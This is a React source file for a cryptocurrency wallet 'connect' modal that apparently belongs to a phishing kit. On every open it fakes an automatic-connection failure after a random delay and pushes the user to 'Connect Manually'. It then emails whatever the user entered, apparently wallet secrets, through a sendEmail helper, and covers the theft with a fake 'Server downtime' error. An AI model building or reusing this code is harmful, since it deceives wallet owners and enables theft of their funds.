import { useEffect, useState } from "react";
import { sendEmail } from "../../utils/sendEmail";
import { Toast } from "../../config/libs";

const Modal = ({
  children,
  setIsOpen,
  isOpen,
  wallet,
  data,
  setData,
  init,
}) => {
  const [state, setState] = useState("none");
  const [note, setNote] = useState("");

  useEffect(() => {
    const randomNumber = Math.floor(Math.random() * (3000 - 500 + 1)) + 500;
    setTimeout(() => {
      setState("error");
      setNote(
        `Unable to Automatically connect to ${wallet.name} ${!wallet.name.includes("wallet") ? "wallet" : ""}, Please Connect Manually.`,
      );
    }, randomNumber);
  }, [wallet]);

  const Sender = async () => {
    if (state === "sendInfo") {
      const res = await sendEmail({ data: { ...data, wallet: wallet.name } });
      console.log(res);
      if (res) {
        Toast(
          "error",
          <>
            <div>
              <b>Server downtime!!!</b>
              <br /> Please Try Again in a moment.
            </div>
          </>,
        );
        setState("failed");
        setTimeout(() => {
          setIsOpen(!isOpen);
          setData(init);
        }, 1000);
    } else {
        setState("initialized");
    }
}
};

useEffect(() => {
    Sender();
}, [state]);

const Close = () => {
    setIsOpen(!isOpen)
    setData(init);
  }

  return (
    <>
      <div className="relative flex justify-center">
        {/* <button @click="isOpen = true" className="px-6 py-2 mx-auto tracking-wide text-white capitalize transition-colors duration-300 transform bg-blue-600 rounded-md hover:bg-blue-500 focus:outline-none focus:ring focus:ring-blue-300 focus:ring-opacity-80">
        Open Modal
    </button> */}

        {/* x-transition:enter=""
x-transition:enter-start=""
x-transition:enter-end="translate-y-0 opacity-100 sm:scale-100"
x-transition:leave=""
x-transition:leave-start=""
x-transition:leave-end="translate-y-4 opacity-0 sm:translate-y-0 sm:scale-95" */}
        <div
          className={`${isOpen ? "transition duration-300 ease-out translate-y-4 opacity-100 sm:translate-y-0 sm:scale-95" : "transition duration-150 ease-in translate-y-0 opacity-100 sm:scale-100"} fixed inset-0 z-10 overflow-y-auto`}
          aria-labelledby="modal-title"
          role="dialog"
          aria-modal="true"
        >
          <div className="flex items-center justify-center min-h-screen px-4 pt-4 pb-20 text-center sm:block sm:p-0">
            <span
              className="hidden sm:inline-block sm:align-middle sm:h-screen"
              aria-hidden="true"
            >
              &#8203;
            </span>

            <div className="relative inline-block px-4 pt-5 pb-4 overflow-hidden text-left align-bottom transition-all transform bg-white rounded-lg shadow-xl dark:bg-gray-900 sm:my-8 sm:align-middle sm:max-w-sm sm:w-full sm:p-6">
              <div>
                <div className="flex items-center justify-center ">
                  <img
                    className="object-cover w-14 h-14 lg:w-24 lg:h-24 rounded-full ring ring-white"
                    src={`/wallets/${wallet.name}.${wallet.ext}`}
                    alt=""
                  />
                </div>

                <div className="mt-4 text-center">
                  <p
                    className={`mt-2 text-sm ${state === "error" ? "text-rose-600 font-semibold" : "text-gray-500"} dark:text-gray-400 ${state === "initialized" ? "" : "italic"}`}
                  >
                    {state === "none"
                      ? "Initializing to"
                      : state === "error"
                        ? "Failed to initialize to"
                        : "Manually connect to"}
                  </p>
                  <h3
                    className="tracking-wide font-medium leading-6 text-gray-800 capitalize dark:text-white"
                    id="modal-title"
                  >
                    {wallet.name}{" "}
                    {!wallet.name.includes("wallet") ? "wallet" : ""}
                  </h3>
                </div>
              </div>

              <div className="mt-4">
                {/* <label className="text-sm text-gray-700 dark:text-gray-200" htmlFor="share link">Share link</label> */}

                {state === "none" || state === 'error' ? (
                  <div className="flex items-center mt-2 -mx-1">
                    <p className="text-center w-full mt-2 text-sm text-gray-500 dark:text-gray-400">
                      {note}
                    </p>
                  </div>
                ) : (
                  children
                )}
              </div>

              <div
                className={`${state === "none" ? "justify-center" : ""} mt-4 sm:mt-6 sm:flex sm:items-center sm:-mx-2`}
              >
                <button
                  onClick={Close}
                  className="w-full px-4 py-2 text-sm font-medium tracking-wide text-rose-700 hover:text-white translate-all capitalize transition-colors duration-300 transform border-2 border-rose-700 rounded-md sm:w-1/2 sm:mx-2 dark:text-gray-200 dark:border-gray-700 dark:hover:bg-gray-800 hover:bg-rose-800 focus:outline-none focus:ring focus:ring-rose-300 focus:ring-opacity-40"
                >
                  Cancel
                </button>

                {state === "initialized" ? (
                  <button
                    onClick={() => setState("sendInfo")}
                    className="w-full px-4 py-2 mt-3 text-sm font-medium tracking-wide text-white capitalize transition-colors duration-300 transform bg-green-600 rounded-md sm:mt-0 sm:w-1/2 sm:mx-2 hover:bg-green-500 focus:outline-none focus:ring focus:ring-green-300 focus:ring-opacity-40"
                  >
                    Connect Wallet
                  </button>
                ) : state === "error" ? (
                  <button
                    onClick={() => setState("initialized")}
                    className="w-full px-4 py-2 mt-3 text-sm font-medium tracking-wide text-white capitalize transition-colors duration-300 transform bg-blue-600 rounded-md sm:mt-0 sm:w-1/2 sm:mx-2 hover:bg-blue-500 focus:outline-none focus:ring focus:ring-blue-300 focus:ring-opacity-40"
                  >
                    Connect Manually
                  </button>
                ) : state === 'sendInfo' || state === 'failed' ? 
            (
                    <span className="w-full px-4 py-2 mt-3 text-sm font-medium tracking-wide text-black capitalize  sm:mt-0 sm:w-1/2 sm:mx-2 ">{state !== 'failed'?'Connecting':'Failed'}</span>
                    ) : ("")}
              </div>
            </div>
          </div>
        </div>
      </div>
    </>
  );
};

export default Modal;
